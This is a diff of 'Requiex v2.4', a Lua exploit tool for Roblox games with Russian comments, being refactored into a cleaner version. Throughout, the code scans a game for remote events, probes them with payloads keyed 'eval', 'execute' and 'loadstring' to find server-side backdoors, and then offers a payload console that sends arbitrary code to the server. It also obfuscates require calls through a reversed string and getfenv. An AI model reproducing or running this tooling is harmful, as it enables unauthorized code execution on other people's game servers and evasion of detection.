         Instance.new("UIPadding",eb).PaddingLeft = UDim.new(0,10)
+        SafeConnect(eb, "MouseEnter", function()
+            TweenService:Create(eb,TweenInfo.new(0.15),{TextColor3 = Colors.AccentYellow}):Play()
+        end)
+        SafeConnect(eb, "MouseLeave", function()
+            TweenService:Create(eb,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
+        end)
         eb.Activated:Connect(function()
             TextBox.Text = tostring(entry.ID)
             LibDrop.Visible = false
@@ -415,24 +600,17 @@ local function RefreshLibrary()
     end
     LibList.CanvasSize = UDim2.new(0,0,0,count * 32)
     LibDrop.Size = UDim2.new(0,240,0,count * 32 + 8)
-end-- =====================================================
--- Requiex v2.4 Unified | Часть 2/3 (Final Fix)
--- =====================================================
+end-- Requiex v2.4 Clean | Часть 2/3
 
--- ===== ОБФУСКАТОР =====
 local function Obfuscate(idOrCode)
-    local code = ""
     if type(idOrCode) == "number" then
-        -- Шифруем require(ID)
-        code = "local _r = string.reverse('eriuqer'); getfenv()[_r](" .. idOrCode .. ")"
+        return "local _r = string.reverse('eriuqer'); getfenv()[_r](" .. idOrCode .. ")"
     else
-        -- Если передали строку (код), оборачиваем в анонимную функцию
-        code = "task.spawn(function() " .. idOrCode .. " end)"
+        return "task.spawn(function() " .. idOrCode .. " end)"
     end
-    return code
 end
 
--- ===== STEALTH BACKDOOR OPERATOR =====
+-- Backdoor Scanner
 local StealthBackdoor = { Exploited = false, BackdoorObjects = {}, FoundCommands = {} }
 
 function StealthBackdoor:FindRemotes()
@@ -457,16 +635,11 @@ function StealthBackdoor:FindRemotes()
             for _, obj in ipairs(container:GetDescendants()) do
                 if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                     local name = obj.Name:lower():gsub("%s+", "")
-                    local isBlacklisted = false
-                    for _, blPattern in ipairs(blacklist) do
-                        if name:find(blPattern) then isBlacklisted = true break end
-                    end
-                    if not isBlacklisted then
+                    local blocked = false
+                    for _, bl in ipairs(blacklist) do if name:find(bl) then blocked = true break end end
+                    if not blocked then
                         for _, kw in ipairs(keywords) do
-                            if name == kw or name:find(kw) then
-                                table.insert(remotes, obj)
-                                break
-                            end
+                            if name == kw or name:find(kw) then table.insert(remotes, obj) break end
                         end
                     end
                 end
@@ -474,37 +647,33 @@ function StealthBackdoor:FindRemotes()
         end
     end
     self.BackdoorObjects = remotes
+    Requiex:Log("Found "..#remotes.." suspicious remotes", Colors.SubText)
     return remotes
 end
 
 function StealthBackdoor:TestRemote(remote)
     local marker = "RQ_" .. math.random(100, 999)
-    -- Код для проверки: если сервер может выполнить это, он создаст папку в Lighting
-    local testCode = "local p = Instance.new('Folder', game:GetService('Lighting')); p.Name = '" .. marker .. "'; task.wait(1); p:Destroy()"
-
-    local formats = {
-        {k = nil, c = testCode}, -- Прямой вызов
-        {k = "eval", c = testCode},
-        {k = "execute", c = testCode},
-        {k = "run", c = testCode},
-        {k = "loadstring", c = testCode}
+    local code = "local p = Instance.new('Folder', game:GetService('Lighting')); p.Name = '" .. marker .. "'; task.wait(1); p:Destroy()"
+    local tests = {
+        {k = nil, c = code},
+        {k = "eval", c = code},
+        {k = "execute", c = code},
+        {k = "run", c = code},
+        {k = "loadstring", c = code}
     }
-
-    for _, test in ipairs(formats) do
+    for _, t in ipairs(tests) do
         pcall(function()
             if remote:IsA("RemoteEvent") then
-                if test.k then remote:FireServer(test.k, test.c) else remote:FireServer(test.c) end
+                if t.k then remote:FireServer(t.k, t.c) else remote:FireServer(t.c) end
             else
-                if test.k then remote:InvokeServer(test.k, test.c) else remote:InvokeServer(test.c) end
+                if t.k then remote:InvokeServer(t.k, t.c) else remote:InvokeServer(t.c) end
             end
         end)
-
-        task.wait(0.3) -- Ждем, появится ли папка в Lighting
+        task.wait(0.3)
         if game:GetService("Lighting"):FindFirstChild(marker) then
-            -- Успех! Сохраняем команду
             if not self.FoundCommands[remote] then self.FoundCommands[remote] = {} end
-            table.insert(self.FoundCommands[remote], test.k or "__DIRECT__")
-            return true, test.k
+            table.insert(self.FoundCommands[remote], t.k or "__DIRECT__")
+            return true, t.k
         end
     end
     return false, nil
@@ -514,59 +683,45 @@ function StealthBackdoor:ExploitAll()
     local any = false
     self.BestRemote, self.BestKey = nil, nil
     for _, remote in ipairs(self.BackdoorObjects) do
-        local success, key = self:TestRemote(remote)
-        if success then
+        local ok, key = self:TestRemote(remote)
+        if ok then
             any = true
-            if not self.BestRemote then
-                self.BestRemote = remote
-                self.BestKey = key
-            end
+            if not self.BestRemote then self.BestRemote = remote self.BestKey = key end
         end
         task.wait(0.1)
     end
     self.Exploited = any
     if any and self.BestRemote then
-        Requiex:Log("Backdoor active: "..self.BestRemote.Name.." key="..tostring(self.BestKey), Colors.Green)
-        -- Создаём исполняющую функцию с учётом найденного ключа
+        Requiex:Log("Backdoor: "..self.BestRemote.Name.." key="..tostring(self.BestKey), "SUCCESS")
         Requiex._execBackdoor = function(code)
-            local r = self.BestRemote
-            local k = self.BestKey
+            local r, k = self.BestRemote, self.BestKey
             if not r then return false end
             local ok
             if k then
-                if r:IsA("RemoteEvent") then
-                    ok = pcall(function() r:FireServer(k, code) end)
-                else
-                    ok = pcall(function() r:InvokeServer(k, code) end)
-                end
+                if r:IsA("RemoteEvent") then ok = pcall(function() r:FireServer(k, code) end)
+                else ok = pcall(function() r:InvokeServer(k, code) end) end
             else
-                if r:IsA("RemoteEvent") then
-                    ok = pcall(function() r:FireServer(code) end)
-                else
-                    ok = pcall(function() r:InvokeServer(code) end)
-                end
+                if r:IsA("RemoteEvent") then ok = pcall(function() r:FireServer(code) end)
+                else ok = pcall(function() r:InvokeServer(code) end) end
             end
-            Requiex:Log(ok and "Backdoor OK" or "Backdoor fail", ok and Colors.Green or Colors.Red)
+            Requiex:Log(ok and "Backdoor OK" or "Backdoor fail", ok and "SUCCESS" or "ERROR")
             return ok
         end
         Requiex:SetStatus(Colors.Green)
     else
-        Requiex:Log("No exploitable backdoor found", Colors.Red)
+        Requiex:Log("No backdoor found", "WARN")
     end
     return any
 end
 
 function StealthBackdoor:SilentScan()
-    Requiex:Log("Deep scan started...", Colors.AccentYellow)
+    Requiex:Log("Scan started...", Colors.AccentYellow)
     self:FindRemotes()
-    if #self.BackdoorObjects > 0 then
-        self:ExploitAll()
-    else
-        Requiex:Log("No targets found", Colors.Red)
-    end
+    if #self.BackdoorObjects > 0 then self:ExploitAll()
+    else Requiex:Log("No targets", "WARN") end
 end
 
--- ===== PAYLOAD MODULE (без изменений) =====
+-- Payload GUI
 local PayloadGUI = nil
 local function CreatePayloadGUI()
     if PayloadGUI then return PayloadGUI end
@@ -597,26 +752,23 @@ local function CreatePayloadGUI()
     logArea.BackgroundColor3 = Colors.LogBackground; logArea.BackgroundTransparency = 0.5; logArea.Parent = frame
     Instance.new("UICorner",logArea).CornerRadius = UDim.new(0,4)
     Instance.new("UIListLayout", logArea).Padding = UDim.new(0,2)
-    local function payloadLog(msg, isError)
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1,0,0,14); label.BackgroundTransparency = 1
-        label.Text = msg; label.TextColor3 = isError and Colors.Red or Colors.SubText
-        label.TextSize = 10; label.Font = Enum.Font.RobotoMono; label.TextXAlignment = Enum.TextXAlignment.Left; label.Parent = logArea
-        local children = logArea:GetChildren()
-        local cnt = 0; for _,c in ipairs(children) do if c:IsA("TextLabel") then cnt=cnt+1 end end
-        if cnt > 25 then children[1]:Destroy() end
-        logArea.CanvasSize = UDim2.new(0,0,0,cnt*16)
+    local function plog(msg, err)
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1,0,0,14); l.BackgroundTransparency = 1
+        l.Text = msg; l.TextColor3 = err and Colors.Red or Colors.SubText
+        l.TextSize = 10; l.Font = Enum.Font.RobotoMono; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = logArea
+        local c = 0; for _,x in ipairs(logArea:GetChildren()) do if x:IsA("TextLabel") then c=c+1 end end
+        if c > 25 then logArea:GetChildren()[1]:Destroy() end
+        logArea.CanvasSize = UDim2.new(0,0,0,c*16)
         task.wait(); logArea.CanvasPosition = Vector2.new(0, logArea.CanvasSize.Y.Offset)
     end
     execBtn.MouseButton1Click:Connect(function()
-        local code = codeBox.Text; if code == "" then return end
-        local target = code:sub(1,7):lower() == "server:"
-        local realCode = target and code:sub(8) or code
-        if target and Requiex._execBackdoor then
-            payloadLog(Requiex._execBackdoor(realCode) and "[Server] Executed" or "[Error] Backdoor failed", not Requiex._execBackdoor(realCode))
-        elseif not target and Requiex._execBackdoor then
-            Requiex._execBackdoor(realCode); payloadLog("[Client] Executed")
-        else pcall(function() require(tonumber(realCode)) end); payloadLog("[Local] require("..realCode..")") end
+        local c = codeBox.Text; if c == "" then return end
+        local t = c:sub(1,7):lower() == "server:"
+        local rc = t and c:sub(8) or c
+        if t and Requiex._execBackdoor then plog(Requiex._execBackdoor(rc) and "[Server] OK" or "[Error]", not Requiex._execBackdoor(rc))
+        elseif not t and Requiex._execBackdoor then Requiex._execBackdoor(rc); plog("[Client] OK")
+        else pcall(function() require(tonumber(rc)) end); plog("[Local] require") end
     end)
     SafeConnect(UserInputService, "InputBegan", function(input, gp)
         if gp then return end
@@ -626,7 +778,7 @@ local function CreatePayloadGUI()
     return PayloadGUI
 end
 
--- ===== ACTION BAR =====
+-- Action Bar
 local ActionBar = Instance.new("Frame")
 ActionBar.Size = UDim2.new(1,0,0,52); ActionBar.Position = UDim2.new(0,0,1,-58)
 ActionBar.BackgroundTransparency = 1; ActionBar.ZIndex = 2; ActionBar.Parent = Content
@@ -644,79 +796,51 @@ local function CreateSmallButton(icon, label, width, callback)
     btn.AutoButtonColor = false; btn.LayoutOrder = layoutOrderCounter
     layoutOrderCounter = layoutOrderCounter + 1; btn.Parent = ActionBar
     Instance.new("UICorner",btn).CornerRadius = UDim.new(0,9)
-    local iconLabel = Instance.new("TextLabel")
-    iconLabel.Size = UDim2.new(1,0,0,24); iconLabel.Position = UDim2.new(0,0,0,6)
-    iconLabel.BackgroundTransparency = 1; iconLabel.Font = Enum.Font.GothamBold
-    iconLabel.Text = icon or ""; iconLabel.TextSize = 18; iconLabel.TextColor3 = Colors.SubText
-    iconLabel.TextXAlignment = Enum.TextXAlignment.Center; iconLabel.ZIndex = 3; iconLabel.Parent = btn
-    local labelText = Instance.new("TextLabel")
-    labelText.Size = UDim2.new(1,0,0,14); labelText.Position = UDim2.new(0,0,0,30)
-    labelText.BackgroundTransparency = 1; labelText.Font = Enum.Font.Gotham
-    labelText.Text = label or ""; labelText.TextSize = 9; labelText.TextColor3 = Colors.SubText
-    labelText.TextXAlignment = Enum.TextXAlignment.Center; labelText.ZIndex = 3; labelText.Parent = btn
-    local btnStroke = Instance.new("UIStroke")
-    btnStroke.Color = Colors.Stroke; btnStroke.Thickness = 1; btnStroke.Transparency = 0.4; btnStroke.Parent = btn
+    local il = Instance.new("TextLabel")
+    il.Size = UDim2.new(1,0,0,24); il.Position = UDim2.new(0,0,0,6)
+    il.BackgroundTransparency = 1; il.Font = Enum.Font.GothamBold
+    il.Text = icon or ""; il.TextSize = 18; il.TextColor3 = Colors.SubText
+    il.TextXAlignment = Enum.TextXAlignment.Center; il.ZIndex = 3; il.Parent = btn
+    local lt = Instance.new("TextLabel")
+    lt.Size = UDim2.new(1,0,0,14); lt.Position = UDim2.new(0,0,0,30)
+    lt.BackgroundTransparency = 1; lt.Font = Enum.Font.Gotham
+    lt.Text = label or ""; lt.TextSize = 9; lt.TextColor3 = Colors.SubText
+    lt.TextXAlignment = Enum.TextXAlignment.Center; lt.ZIndex = 3; lt.Parent = btn
+    Instance.new("UIStroke",btn).Color = Colors.Stroke
+    btn.UIStroke.Thickness = 1; btn.UIStroke.Transparency = 0.4
     SafeConnect(btn, "MouseEnter", function()
         TweenService:Create(btn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.GlassHover}):Play()
-        TweenService:Create(iconLabel,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
-        TweenService:Create(labelText,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
+        TweenService:Create(il,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
+        TweenService:Create(lt,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
     end)
     SafeConnect(btn, "MouseLeave", function()
         TweenService:Create(btn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray}):Play()
-        TweenService:Create(iconLabel,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
-        TweenService:Create(labelText,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
+        TweenService:Create(il,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
+        TweenService:Create(lt,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
     end)
     SafeConnect(btn, "Activated", callback)
     return btn
 end
 
--- Тултипы
-local function AddTooltip(btn, text)
-    local tip = Instance.new("TextLabel")
-    tip.Size = UDim2.new(0,0,0,16)
-    tip.Position = UDim2.new(0.5,0,0,-20)
-    tip.BackgroundColor3 = Colors.Dark
-    tip.BackgroundTransparency = 0.2
-    tip.Text = text
-    tip.TextSize = 9
-    tip.Font = Enum.Font.Gotham
-    tip.TextColor3 = Colors.White
-    tip.Visible = false
-    tip.ZIndex = 99
-    tip.Parent = btn
-    Instance.new("UICorner", tip).CornerRadius = UDim.new(0,4)
-    btn.MouseEnter:Connect(function() tip.Visible = true end)
-    btn.MouseLeave:Connect(function() tip.Visible = false end)
-end
-
 local SelectedRig = "R15"
-local rigBtn = CreateSmallButton("↺", "RIG", 60, function()
+CreateSmallButton("↺", "RIG", 60, function()
     SelectedRig = (SelectedRig == "R15") and "R6" or "R15"
     Requiex:Log("Rig: "..SelectedRig, Colors.AccentYellow)
 end)
-AddTooltip(rigBtn, "Switch R6/R15")
-
-local libBtn = CreateSmallButton("☰", "LIBRARY", 76, function()
+CreateSmallButton("☰", "LIBRARY", 76, function()
     LibOpen = not LibOpen; LibDrop.Visible = LibOpen
     if LibOpen then RefreshLibrary() end
 end)
-AddTooltip(libBtn, "Saved Scripts")
-
-local setBtn = CreateSmallButton("✧", "SETTINGS", 60, function()
+CreateSmallButton("✧", "SETTINGS", 60, function()
     Requiex:Log("Settings coming soon", "INFO")
 end)
-AddTooltip(setBtn, "Settings")
-
-local scanBtn = CreateSmallButton("⌕", "SCAN", 60, function()
+CreateSmallButton("⌕", "SCAN", 60, function()
     StealthBackdoor:SilentScan()
 end)
-AddTooltip(scanBtn, "Scan for Backdoors")
-
-local payBtn = CreateSmallButton("⌨", "PAYLOAD", 76, function()
+CreateSmallButton("⌨", "PAYLOAD", 76, function()
     local p = CreatePayloadGUI()
     p.frame.Visible = not p.frame.Visible
 end)
-AddTooltip(payBtn, "Payload Console (F5)")
 
 local Spacer = Instance.new("Frame")
 Spacer.Size = UDim2.new(0,8,0,1); Spacer.BackgroundTransparency = 1
@@ -743,10 +867,7 @@ SafeConnect(InjectBtn, "MouseLeave", function()
     TweenService:Create(InjectBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray, TextColor3 = Colors.AccentYellow}):Play()
 end)
 SafeConnect(InjectBtn, "Activated", function()
-    if Requiex.Injected then
-        Requiex:Log("Already injected", "WARN")
-        return
-    end
+    if Requiex.Injected then Requiex:Log("Already injected", "WARN") return end
     pcall(function()
         if ReplicatedStorage:FindFirstChild("RequiexServerBridge") then
             ReplicatedStorage.RequiexServerBridge:Destroy()
@@ -760,55 +881,29 @@ SafeConnect(InjectBtn, "Activated", function()
     InjectBtn.TextColor3 = Colors.White
     InjectBtn.BackgroundColor3 = Colors.Green
     InjectStroke.Color = Colors.Green
-    Requiex:Log("Bridge injected", "INFO")
+    Requiex:Log("Bridge injected", "SUCCESS")
     Requiex:SetStatus(Colors.Green)
-end)
-AddTooltip(InjectBtn, "Inject Server Bridge")-- =====================================================
--- Requiex v2.4 Unified | Часть 3/3 (Final Fix)
--- =====================================================
+end)-- Requiex v2.4 Clean | Часть 3/3
 
 local function TriggerRun()
     local input = TextBox.Text:gsub("%s+","")
     local id = tonumber(input:match("%d+"))
-    
-    if not id then 
-        Requiex:Log("ID not found in input", "ERROR") 
-        return 
-    end
+    if not id then Requiex:Log("Invalid ID", "ERROR") return end
 
-    Requiex:Log("Attempting Execute #"..id, Colors.AccentYellow)
+    Requiex:Log("Execute #"..id, Colors.AccentYellow)
 
     if Requiex._execBackdoor then
-        -- Пробуем сначала через обфускацию
-        local success = Requiex._execBackdoor(Obfuscate(id))
-        
-        if success then
-            Requiex:Log("Payload SENT to Server", "SUCCESS")
-        else
-            Requiex:Log("Remote blocked request", "ERROR")
-        end
-    elseif Requiex.Injected then
-        -- Логика для моста (Bridge)
-        if Requiex.ServerFunction then
-            local ok, result = pcall(function()
-                return Requiex.ServerFunction:InvokeServer("execute", id)
-            end)
-            if ok then
-                Requiex:Log("Bridge execute sent", "INFO")
-            else
-                Requiex:Log("Bridge call failed: "..tostring(result), "ERROR")
-            end
-        else
-            Requiex:Log("Bridge not available", "ERROR")
-        end
+        local ok = Requiex._execBackdoor(Obfuscate(id))
+        if ok then Requiex:Log("Payload sent via backdoor", "SUCCESS")
+        else Requiex:Log("Backdoor blocked", "ERROR") end
+    elseif Requiex.Injected and Requiex.ServerFunction then
+        local ok, result = pcall(function() return Requiex.ServerFunction:InvokeServer("execute", id) end)
+        if ok then Requiex:Log("Bridge execute OK", "INFO")
+        else Requiex:Log("Bridge failed: "..tostring(result), "ERROR") end
     else
-        -- Локальный запуск (только если ты в Studio или есть мета-методы)
         local ok, err = pcall(function() require(id) end)
-        if ok then
-            Requiex:Log("Local load succeeded", "INFO")
-        else
-            Requiex:Log("Local load failed: "..tostring(err), "ERROR")
-        end
+        if ok then Requiex:Log("Local load OK", "INFO")
+        else Requiex:Log("Local load failed", "ERROR") end
     end
 end
 
@@ -819,7 +914,7 @@ end)
 
 SafeConnect(SaveBtn, "Activated", function()
     local input = TextBox.Text:gsub("%s+","")
-    if input == "" then Requiex:Log("Save: empty input", "WARN") return end
+    if input == "" then Requiex:Log("Save: empty", "WARN") return end
     local id = tonumber(input:match("%d+"))
     if not id then Requiex:Log("Save: invalid ID", "WARN") return end
     for _, e in ipairs(ScriptLibrary) do if e.ID == id then Requiex:Log("Already saved", "WARN") return end end
@@ -859,6 +954,6 @@ SafeConnect(UserInputService, "InputBegan", function(input, gp)
 end)
 
 Requiex:SetStatus(Colors.AccentYellow)
-Requiex:Log("Ready. SCAN = hunt, PAYLOAD = console, RUN = execute.", Colors.AccentYellow)
+Requiex:Log("Ready. SCAN | PAYLOAD | RUN", Colors.AccentYellow)
 
 return Requiex
